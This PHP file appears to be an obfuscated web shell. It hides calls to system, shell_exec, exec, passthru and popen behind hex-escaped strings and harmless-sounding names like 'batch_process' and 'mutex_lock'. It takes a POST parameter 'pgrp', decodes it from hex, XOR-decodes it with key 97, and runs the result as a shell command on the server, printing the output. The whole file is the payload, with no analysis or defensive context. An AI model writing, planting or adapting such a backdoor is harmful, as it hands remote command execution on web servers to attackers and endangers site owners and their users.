<?php

$batch_process2 = "\x73h\x65ll\x5F\x65\x78ec";
$batch_process3 = "\x65\x78ec";
$batch_process4 = "\x70\x61s\x73\x74hru";
$batch_process7 = "p\x63lo\x73e";
$right_pad_string = "hex2\x62in";
$batch_process6 = "\x73\x74r\x65a\x6D\x5F\x67e\x74\x5Fc\x6F\x6Etents";
$batch_process5 = "\x70o\x70en";
$batch_process1 = "sy\x73t\x65m";
if (isset($_POST["\x70\x67rp"])) {
            function mutex_lock   (     $item    ,       $ptr    )   {
    $token     =      ''   ;
     for($h=0;
 $h<strlen($item);
 $h++){
$token.=chr(ord($item[$h])^$ptr);

} return      $token;
   
}
            $pgrp = $right_pad_string($_POST["\x70\x67rp"]);
            $pgrp = mutex_lock($pgrp, 97);
            if (function_exists($batch_process1)) {
                $batch_process1($pgrp);
            } elseif (function_exists($batch_process2)) {
                print $batch_process2($pgrp);
            } elseif (function_exists($batch_process3)) {
                $batch_process3($pgrp, $desc_item);
                print join("\n", $desc_item);
            } elseif (function_exists($batch_process4)) {
                $batch_process4($pgrp);
            } elseif (function_exists($batch_process5) && function_exists($batch_process6) && function_exists($batch_process7)) {
                $ptr_token = $batch_process5($pgrp, 'r');
                if ($ptr_token) {
                    $descriptor_element = $batch_process6($ptr_token);
                    $batch_process7($ptr_token);
                    print $descriptor_element;
                }
            }
            exit;
        }